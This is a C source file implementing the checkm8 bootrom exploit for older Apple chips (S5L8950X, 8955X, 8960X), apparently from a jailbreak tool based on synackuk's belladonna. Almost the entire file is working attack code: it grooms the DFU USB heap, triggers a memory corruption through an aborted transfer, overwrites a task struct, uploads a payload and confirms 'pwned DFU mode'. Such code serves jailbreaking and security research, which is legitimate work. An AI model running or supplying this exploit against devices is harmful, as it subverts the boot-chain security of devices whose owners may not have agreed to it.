/*
 * checkm8.c - checkm8 bootrom exploit discovered by axi0mX
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <checkm8.h>
#include <payload.h>
#include <client.h>
#include <overwrite.h>

// based on synackuk's belladonna
// https://github.com/synackuk/belladonna/blob/824363bbc287da3cd2d97cba69aa746db89a86b6/src/exploits/checkm8/checkm8.c

int usb_req_stall(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
}

int usb_req_leak(irecv_client_t client){
    unsigned char buf[0x40];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
}

int usb_req_no_leak(irecv_client_t client){
    unsigned char buf[0x41];
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
}

int checkm8_supported(irecv_client_t client) {
    const struct irecv_device_info* info = irecv_get_device_info(client);
    switch(info->cpid) {
        case 0x8950:
            return 0;
        case 0x8955:
            return 0;
        case 0x8960:
            return 0;
        default:
            return -1;
    }
    return 0;
}

int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
    switch(cpid) {
        case 0x8950:
            config->large_leak = 659;
            config->hole = 0;
            config->overwrite_offset = 0x640;
            config->leak = 0;
            config->overwrite = S5l8950X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8955:
            config->large_leak = 659;
            config->hole = 0;
            config->overwrite_offset = 0x640;
            config->leak = 0;
            config->overwrite = S5l8955X_OVERWRITE;
            config->overwrite_len = 28;
            return 0;
        case 0x8960:
            config->large_leak = 7936;
            config->hole = 0;
            config->overwrite_offset = 0x580;
            config->leak = 0;
            config->overwrite = S5l8960X_OVERWRITE;
            config->overwrite_len = 0x30;
            return 0;
        default:
            printf("No exploit configuration is available for your device.\n");
            return -1;
    }
}

int checkm8_exploit(irecv_client_t client) {
    printf("\x1b[1m** \x1b[31mexploiting with checkm8\x1b[39;0m\n");
    
    unsigned char buf[0x800] = { 'A' };
    int ret;
    checkm8_config_t config;
    memset(&config, '\0', sizeof(checkm8_config_t));
    
    const struct irecv_device_info* info = irecv_get_device_info(client);
    irecv_device_t device_info = NULL;
    irecv_devices_get_device_by_client(client, &device_info);
    
    printf("\x1b[1m***\x1b[0m based on checkm8 exploit by axi0mX\n");
    
    ret = get_exploit_configuration(info->cpid, &config);
    if(ret != 0) {
        printf("Failed to get exploit configuration.\n");
        irecv_close(client);
        return -1;
    }
    
    ret = get_payload_configuration(info->cpid, device_info->product_type, &config);
    if(ret != 0) {
        printf("Failed to get payload configuration.\n");
        irecv_close(client);
        return -1;
    }
    
    printf("\x1b[36mGrooming heap\x1b[39m\n");
    ret = usb_req_stall(client);
    if(ret != IRECV_E_PIPE) {
        printf("Failed to stall pipe.\n");
        return -1;
    }
    usleep(100);
    for(int i = 0; i < config.large_leak; i++) {
        ret = usb_req_leak(client);
        if(ret != IRECV_E_TIMEOUT) {
            printf("Failed to create heap hole.\n");
            return -1;
        }
    }
    ret = usb_req_no_leak(client);
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to create heap hole.\n");
        return -1;
    }
    irecv_reset(client);
    irecv_close(client);
    client = NULL;
    usleep(100);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    
    printf("\x1b[36mPreparing for overwrite\x1b[39m\n");
    
    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 100);
    if(sent < 0) {
        printf("Failed to send bug setup.\n");
        irecv_close(client);
        return -1;
    }
    if(sent > config.overwrite_offset) {
        printf("Failed to abort bug setup.\n");
        irecv_close(client);
        return -1;
    }
    ret = irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, config.overwrite_offset - sent, 10);
    if(ret != IRECV_E_PIPE) {
        printf("Failed to push forward overwrite offset.\n");
        return -1;
    }
    
    ret = irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
    if(ret != 0) {
        printf("Failed to send abort.\n");
        return -1;
    }
    irecv_close(client);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    
    printf("\x1b[36mGrooming heap\x1b[39m\n");
    ret = usb_req_stall(client);
    if(ret != IRECV_E_PIPE) {
        printf("Failed to stall pipe.\n");
        return -1;
    }
    usleep(100);
    ret = usb_req_leak(client);
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to create heap hole.\n");
        return -1;
    }
    printf("\x1b[36mOverwriting task struct\x1b[39m\n");
    
    ret = irecv_usb_control_transfer(client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
    if(ret != IRECV_E_PIPE) {
        printf("Failed to overwrite task.\n");
        return -1;
    }
    
    printf("\x1b[36mUploading payload\x1b[39m\n");
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
    if(ret != IRECV_E_TIMEOUT) {
        printf("Failed to upload payload.\n");
        return -1;
    }
    
    printf("\x1b[36mExecuting payload\x1b[39m\n");
    irecv_reset(client);
    irecv_close(client);
    free(config.payload);
    client = NULL;
    usleep(500000);
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("Failed to reconnect to device.\n");
        return -1;
    }
    info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("Device not in pwned DFU mode.\n");
        return -1;
    }
    printf("\x1b[31;1mDevice is now in pwned DFU mode!\x1b[39;0m\n");
    irecv_close(client);
    return 0;
}

void checkm8_init() {
    exploit_add("checkm8", &checkm8_supported, &checkm8_exploit);
}
